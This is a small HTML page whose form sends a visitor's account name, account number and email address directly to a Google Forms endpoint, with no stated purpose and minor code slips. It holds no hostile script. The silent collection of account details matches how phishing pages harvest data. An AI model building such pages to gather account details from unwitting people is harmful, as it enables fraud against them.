<!DOCTYPE html>
<html lang="en">
  <head>

    <link
      rel="icon"
      href="/src/images/icons/logo.png"
      sizes="16x16 32x32"
      type="image/png"
    />
    <title>Ui gagi form pareh</title>
    <style>
      html,
      body {
        height: 100%;
        width: 100%;
      }
      body {
        margin: 0;
        padding: 0;
        line-height: 1;
        width: 100%;
        height: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
      }
      .form-wrapper {
        display: flex;
        flex-direction: column;
        justify-content: center;

      }
      form {
        display: flex;

        margin: 0 auto;

        width: 50%;
      }
      label {
        -webkit-touch-callout: none;
        -webkit-user-select: none;
        -khtml-user-select: none;
        -moz-user-select: none;
        -ms-user-select: none;
        user-select: none;
      }
    </style>
  </head>
  <body>
    <div class="form-wrapper">
      <form
        action="https://docs.google.com/forms/u/0/d/e/1FAIpQLSfScxhbKW8tFPjIu7KUPVe_UATxav5UkfvAjSzUXacuf5fQkg/formResponse"
        method="post"
      >
        <input type="text" autocomplete="off" name="i2 i3" placeholder="Your Account Name">
        <input type="nummer" autocomplete="off" name="i6 i7" placeholder="Your Account Number">
        <input type="email" autocomplete="off" name="YPqjbf" placeholder="Your Email">
        <button type="submit">Submit</button>
    </form>
    </div>
    <script>
      function clicked(e) {
        if (!confirm("Are you sure?")) {
          e.preventDefault();
        }
      }
    </script>
  </body>
</html>
